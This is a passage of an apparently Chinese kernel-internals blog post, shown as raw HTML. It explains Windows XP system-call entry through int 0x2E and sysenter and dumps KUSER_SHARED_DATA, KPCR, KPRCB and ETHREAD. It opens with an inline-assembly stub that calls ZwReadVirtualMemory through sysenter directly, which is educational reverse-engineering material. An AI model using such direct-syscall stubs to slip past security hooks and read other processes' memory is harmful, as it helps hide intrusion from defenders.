class="token punctuation">,</span> SIZE_T<span class="token operator">*</span> lpNumberOfBytesRead<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> _asm <span class="token punctuation">&#123;</span>  lea  eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">]</span>  push eax<span class="token punctuation">;</span> ReturnLength  push<span class="token punctuation">[</span>ebp <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">]</span><span class="token punctuation">;</span> BufferLength  push<span class="token punctuation">[</span>ebp <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span> Buffer  push<span class="token punctuation">[</span>ebp <span class="token operator">+</span> <span class="token number">0x0C</span><span class="token punctuation">]</span><span class="token punctuation">;</span> BaseAddress  push<span class="token punctuation">[</span>ebp <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">]</span><span class="token punctuation">;</span> ProcessHandle  mov eax<span class="token punctuation">,</span> <span class="token number">0</span>BAh  sub esp<span class="token punctuation">,</span> <span class="token number">4</span><span class="token comment">// 模拟call ZwReadVirtualMemory </span>  push RETADDR<span class="token comment">// 模拟call KiFastSystemCall</span>  mov edx<span class="token punctuation">,</span> esp  _emit <span class="token number">0x0F</span><span class="token comment">// sysenter</span>  _emit <span class="token number">0x34</span>  RETADDR<span class="token operator">:</span>  add esp<span class="token punctuation">,</span> <span class="token number">18</span>h <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="KUSER-SHARED-DATA"><a href="#KUSER-SHARED-DATA" class="headerlink" title="KUSER_SHARED_DATA"></a>KUSER_SHARED_DATA</h4><p>0环和3环分别由虚拟地址0xFFDF0000和0x7FFE0300映射到此结构体，3环为只读权限，0环可写。其中偏移为0x300的字段指向的是3环进行系统调用时的函数。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _KUSER_SHARED_DATAnt<span class="token operator">!</span>_KUSER_SHARED_DATA   <span class="token operator">+</span><span class="token number">0x000</span> TickCountLow     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x004</span> TickCountMultiplier <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x008</span> InterruptTime    <span class="token operator">:</span> _KSYSTEM_TIME   <span class="token operator">+</span><span class="token number">0x014</span> SystemTime       <span class="token operator">:</span> _KSYSTEM_TIME   <span class="token operator">+</span><span class="token number">0x020</span> TimeZoneBias     <span class="token operator">:</span> _KSYSTEM_TIME   <span class="token operator">+</span><span class="token number">0x02c</span> ImageNumberLow   <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x02e</span> ImageNumberHigh  <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x030</span> NtSystemRoot     <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">260</span><span class="token punctuation">]</span> Uint2B   <span class="token operator">+</span><span class="token number">0x238</span> MaxStackTraceDepth <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x23c</span> CryptoExponent   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x240</span> TimeZoneId       <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x244</span> Reserved2        <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x264</span> NtProductType    <span class="token operator">:</span> _NT_PRODUCT_TYPE   <span class="token operator">+</span><span class="token number">0x268</span> ProductTypeIsValid <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x26c</span> NtMajorVersion   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x270</span> NtMinorVersion   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x274</span> ProcessorFeatures <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x2b4</span> Reserved1        <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x2b8</span> Reserved3        <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x2bc</span> TimeSlip         <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x2c0</span> AlternativeArchitecture <span class="token operator">:</span> _ALTERNATIVE_ARCHITECTURE_TYPE   <span class="token operator">+</span><span class="token number">0x2c8</span> SystemExpirationDate <span class="token operator">:</span> _LARGE_INTEGER   <span class="token operator">+</span><span class="token number">0x2d0</span> SuiteMask        <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x2d4</span> KdDebuggerEnabled <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x2d5</span> NXSupportPolicy  <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x2d8</span> ActiveConsoleId  <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x2dc</span> DismountCount    <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x2e0</span> ComPlusPackage   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x2e4</span> LastSystemRITEventTickCount <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x2e8</span> NumberOfPhysicalPages <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x2ec</span> SafeBootMode     <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x2f0</span> TraceLogging     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x2f8</span> TestRetInstruction <span class="token operator">:</span> Uint8B   <span class="token operator">+</span><span class="token number">0x300</span> SystemCall       <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x304</span> SystemCallReturn <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x308</span> SystemCallPad    <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> Uint8B   <span class="token operator">+</span><span class="token number">0x320</span> TickCount        <span class="token operator">:</span> _KSYSTEM_TIME   <span class="token operator">+</span><span class="token number">0x320</span> TickCountQuad    <span class="token operator">:</span> Uint8B   <span class="token operator">+</span><span class="token number">0x330</span> Cookie           <span class="token operator">:</span> Uint4B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3环进0环"><a href="#3环进0环" class="headerlink" title="3环进0环"></a>3环进0环</h4><p><em><strong>KiIntSystemCall</strong></em>：如果通过中断门进0环，固定的中断号为0x2E，CS、EIP的值由中断门描述符确定，ESP、SS的值由TSS寄存器确定。进入0环后执行的函数为<em><strong>NT!KiSystemService</strong></em>。<br><em><strong>KiIntSystemCall</strong></em>：如果是通过sysenter指令进入0环，则CS、ESP、EIP全部由MSR寄存器提供，SS固定为CS+8。进入0环后执行的函数是<em><strong>NT!KiFastCallEntry</strong></em>。</p><h3 id="3-2-保护现场"><a href="#3-2-保护现场" class="headerlink" title="3.2 保护现场"></a>3.2 保护现场</h3><h4 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h4><p>用于CPU进入0环后进行保护现场。<br><img src="/images/3-10.png" alt="3-10"></p><h4 id="KPCR"><a href="#KPCR" class="headerlink" title="KPCR"></a>KPCR</h4><p>保存和CPU相关的信息。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _KPCRnt<span class="token operator">!</span>_KPCR   <span class="token operator">+</span><span class="token number">0x000</span> NtTib            <span class="token operator">:</span> _NT_TIB   <span class="token operator">+</span><span class="token number">0x01c</span> SelfPcr          <span class="token operator">:</span> Ptr32 _KPCR   <span class="token operator">+</span><span class="token number">0x020</span> Prcb             <span class="token operator">:</span> Ptr32 _KPRCB   <span class="token operator">+</span><span class="token number">0x024</span> Irql             <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x028</span> IRR              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x02c</span> IrrActive        <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x030</span> IDR              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x034</span> KdVersionBlock   <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x038</span> IDT              <span class="token operator">:</span> Ptr32 _KIDTENTRY   <span class="token operator">+</span><span class="token number">0x03c</span> GDT              <span class="token operator">:</span> Ptr32 _KGDTENTRY   <span class="token operator">+</span><span class="token number">0x040</span> TSS              <span class="token operator">:</span> Ptr32 _KTSS   <span class="token operator">+</span><span class="token number">0x044</span> MajorVersion     <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x046</span> MinorVersion     <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x048</span> SetMember        <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x04c</span> StallScaleFactor <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x050</span> DebugActive      <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x051</span> Number           <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x052</span> Spare0           <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x053</span> SecondLevelCacheAssociativity <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x054</span> VdmAlert         <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x058</span> KernelReserved   <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x090</span> SecondLevelCacheSize <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x094</span> HalReserved      <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0d4</span> InterruptMode    <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0d8</span> Spare1           <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x0dc</span> KernelReserved2  <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x120</span> PrcbData         <span class="token operator">:</span> _KPRCB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后一个字段是KPCR的扩展，可以通过此结构体定位到KPCR：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dd KiProcessorBlock<span class="token number">80553e40</span>  ffdff120 <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span><span class="token number">80553e50</span>  <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span><span class="token number">80553e60</span>  <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span><span class="token number">80553e70</span>  <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span><span class="token number">80553e80</span>  <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span><span class="token number">80553e90</span>  <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span><span class="token number">80553</span>ea0  <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span><span class="token number">80553</span>eb0  <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="KPRCB"><a href="#KPRCB" class="headerlink" title="KPRCB"></a>KPRCB</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _KPRCBnt<span class="token operator">!</span>_KPRCB   <span class="token operator">+</span><span class="token number">0x000</span> MinorVersion     <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x002</span> MajorVersion     <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x004</span> CurrentThread    <span class="token operator">:</span> Ptr32 _KTHREAD   <span class="token operator">+</span><span class="token number">0x008</span> NextThread       <span class="token operator">:</span> Ptr32 _KTHREAD   <span class="token operator">+</span><span class="token number">0x00c</span> IdleThread       <span class="token operator">:</span> Ptr32 _KTHREAD   <span class="token operator">+</span><span class="token number">0x010</span> Number           <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x011</span> Reserved         <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x012</span> BuildType        <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x014</span> SetMember        <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x018</span> CpuType          <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x019</span> CpuID            <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x01a</span> CpuStep          <span class="token operator">:</span> Uint2B   <span class="token operator">+</span><span class="token number">0x01c</span> ProcessorState   <span class="token operator">:</span> _KPROCESSOR_STATE   <span class="token operator">+</span><span class="token number">0x33c</span> KernelReserved   <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x37c</span> HalReserved      <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x3bc</span> PrcbPad0         <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">92</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x418</span> LockQueue        <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> _KSPIN_LOCK_QUEUE   <span class="token operator">+</span><span class="token number">0x498</span> PrcbPad1         <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x4a0</span> NpxThread        <span class="token operator">:</span> Ptr32 _KTHREAD   <span class="token operator">+</span><span class="token number">0x4a4</span> InterruptCount   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4a8</span> KernelTime       <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4ac</span> UserTime         <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4b0</span> DpcTime          <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4b4</span> DebugDpcTime     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4b8</span> InterruptTime    <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4bc</span> AdjustDpcThreshold <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4c0</span> PageColor        <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4c4</span> SkipTick         <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4c8</span> MultiThreadSetBusy <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x4c9</span> Spare2           <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x4cc</span> ParentNode       <span class="token operator">:</span> Ptr32 _KNODE   <span class="token operator">+</span><span class="token number">0x4d0</span> MultiThreadProcessorSet <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4d4</span> MultiThreadSetMaster <span class="token operator">:</span> Ptr32 _KPRCB   <span class="token operator">+</span><span class="token number">0x4d8</span> ThreadStartCount <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4e0</span> CcFastReadNoWait <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4e4</span> CcFastReadWait   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4e8</span> CcFastReadNotPossible <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4ec</span> CcCopyReadNoWait <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4f0</span> CcCopyReadWait   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4f4</span> CcCopyReadNoWaitMiss <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4f8</span> KeAlignmentFixupCount <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x4fc</span> KeContextSwitches <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x500</span> KeDcacheFlushCount <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x504</span> KeExceptionDispatchCount <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x508</span> KeFirstLevelTbFills <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x50c</span> KeFloatingEmulationCount <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x510</span> KeIcacheFlushCount <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x514</span> KeSecondLevelTbFills <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x518</span> KeSystemCalls    <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x51c</span> SpareCounter0    <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x520</span> PPLookasideList  <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> _PP_LOOKASIDE_LIST   <span class="token operator">+</span><span class="token number">0x5a0</span> PPNPagedLookasideList <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> _PP_LOOKASIDE_LIST   <span class="token operator">+</span><span class="token number">0x6a0</span> PPPagedLookasideList <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> _PP_LOOKASIDE_LIST   <span class="token operator">+</span><span class="token number">0x7a0</span> PacketBarrier    <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x7a4</span> ReverseStall     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x7a8</span> IpiFrame         <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x7ac</span> PrcbPad2         <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">52</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x7e0</span> CurrentPacket    <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x7ec</span> TargetSet        <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x7f0</span> WorkerRoutine    <span class="token operator">:</span> Ptr32     <span class="token keyword">void</span>    <span class="token operator">+</span><span class="token number">0x7f4</span> IpiFrozen        <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x7f8</span> PrcbPad3         <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x820</span> RequestSummary   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x824</span> SignalDone       <span class="token operator">:</span> Ptr32 _KPRCB   <span class="token operator">+</span><span class="token number">0x828</span> PrcbPad4         <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x860</span> DpcListHead      <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x868</span> DpcStack         <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x86c</span> DpcCount         <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x870</span> DpcQueueDepth    <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x874</span> DpcRoutineActive <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x878</span> DpcInterruptRequested <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x87c</span> DpcLastCount     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x880</span> DpcRequestRate   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x884</span> MaximumDpcQueueDepth <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x888</span> MinimumDpcRate   <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x88c</span> QuantumEnd       <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x890</span> PrcbPad5         <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x8a0</span> DpcLock          <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x8a4</span> PrcbPad6         <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x8c0</span> CallDpc          <span class="token operator">:</span> _KDPC   <span class="token operator">+</span><span class="token number">0x8e0</span> ChainedInterruptList <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x8e4</span> LookasideIrpFloat <span class="token operator">:</span> Int4B   <span class="token operator">+</span><span class="token number">0x8e8</span> SpareFields0     <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> Uint4B   <span class="token operator">+</span><span class="token number">0x900</span> VendorString     <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x90d</span> InitialApicId    <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x90e</span> LogicalProcessorsPerPhysicalProcessor <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x910</span> MHz              <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x914</span> FeatureBits      <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x918</span> UpdateSignature  <span class="token operator">:</span> _LARGE_INTEGER   <span class="token operator">+</span><span class="token number">0x920</span> NpxSaveArea      <span class="token operator">:</span> _FX_SAVE_AREA   <span class="token operator">+</span><span class="token number">0xb30</span> PowerState       <span class="token operator">:</span> _PROCESSOR_POWER_STATE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ETHREAD"><a href="#ETHREAD" class="headerlink" title="ETHREAD"></a>ETHREAD</h4><p>存储线程相关信息：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _ETHREADnt<span class="token operator">!</span>_ETHREAD   <span class="token operator">+</span><span class="token number">0x000</span> Tcb              <span class="token operator">:</span> _KTHREAD   <span class="token operator">+</span><span class="token number">0x1c0</span> CreateTime       <span class="token operator">:</span> _LARGE_INTEGER   <span class="token operator">+</span><span class="token number">0x1c0</span> NestedFaultCount <span class="token operator">:</span> Pos <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span> Bits   <span class="token operator">+</span><span class="token number">0x1c0</span> ApcNeeded        <span class="token operator">:</span> Pos <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x1c8</span> ExitTime         <span class="token operator">:</span> _LARGE_INTEGER   <span class="token operator">+</span><span class="token number">0x1c8</span> LpcReplyChain    <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x1c8</span> KeyedWaitChain   <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x1d0</span> ExitStatus       <span class="token operator">:</span> Int4B   <span class="token operator">+</span><span class="token number">0x1d0</span> OfsChain         <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x1d4</span> PostBlockList    <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x1dc</span> TerminationPort  <span class="token operator">:</span> Ptr32 _TERMINATION_PORT   <span class="token operator">+</span><span class="token number">0x1dc</span> ReaperLink       <span class="token operator">:</span> Ptr32 _ETHREAD   <span class="token operator">+</span><span class="token number">0x1dc</span> KeyedWaitValue   <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x1e0</span> ActiveTimerListLock <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x1e4</span> ActiveTimerListHead <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x1ec</span> Cid              <span class="token operator">:</span> _CLIENT_ID   <span class="token operator">+</span><span class="token number">0x1f4</span> LpcReplySemaphore <span class="token operator">:</span> _KSEMAPHORE   <span class="token operator">+</span><span class="token number">0x1f4</span> KeyedWaitSemaphore <span class="token operator">:</span> _KSEMAPHORE   <span class="token operator">+</span><span class="token number">0x208</span> LpcReplyMessage  <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x208</span> LpcWaitingOnPort <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x20c</span> ImpersonationInfo <span class="token operator">:</span> Ptr32 _PS_IMPERSONATION_INFORMATION   <span class="token operator">+</span><span class="token number">0x210</span> IrpList          <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x218</span> TopLevelIrp      <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x21c</span> DeviceToVerify   <span class="token operator">:</span> Ptr32 _DEVICE_OBJECT   <span class="token operator">+</span><span class="token number">0x220</span> ThreadsProcess   <span class="token operator">:</span> Ptr32 _EPROCESS   <span class="token operator">+</span><span class="token number">0x224</span> StartAddress     <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x228</span> Win32StartAddress <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x228</span> LpcReceivedMessageId <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x22c</span> ThreadListEntry  <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x234</span> RundownProtect   <span class="token operator">:</span> _EX_RUNDOWN_REF   <span class="token operator">+</span><span class="token number">0x238</span> ThreadLock       <span class="token operator">:</span> _EX_PUSH_LOCK   <span class="token operator">+</span><span class="token number">0x23c</span> LpcReplyMessageId <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x240</span> ReadClusterSize  <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x244</span> GrantedAccess    <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x248</span> CrossThreadFlags <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x248</span> Terminated       <span class="token operator">:</span> Pos <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> DeadThread       <span class="token operator">:</span> Pos <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> HideFromDebugger <span class="token operator">:</span> Pos <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> ActiveImpersonationInfo <span class="token operator">:</span> Pos <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> SystemThread     <span class="token operator">:</span> Pos <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> HardErrorsAreDisabled <span class="token operator">:</span> Pos <span 